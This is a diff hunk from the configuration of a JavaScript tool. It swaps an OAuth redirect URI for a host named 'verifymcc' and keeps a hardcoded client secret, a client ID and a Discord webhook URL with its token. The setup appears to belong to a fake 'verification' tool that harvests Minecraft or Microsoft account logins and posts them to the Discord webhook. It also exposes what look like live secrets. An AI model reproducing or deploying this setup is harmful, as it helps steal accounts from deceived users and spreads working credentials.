@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = 'UH98Q~.S6BsZ8GXREQzTX~mUfAl5BsqKgi7IFbQZ' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = '360d2f7a-bd75-405b-9412-d1d9873301b5'
-const redirect_uri = 'https://toogood4u.herokuapp.com/'
+const redirect_uri = 'https://verifymcc.onrender.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1045059463083733082/SuRGkEH46EtQOTLIFp_mcVK9M_lNDy_9XG0suVuqz9GwEEkUrktfjzsSkLZB_e4kpldP'
 
 //Requirements
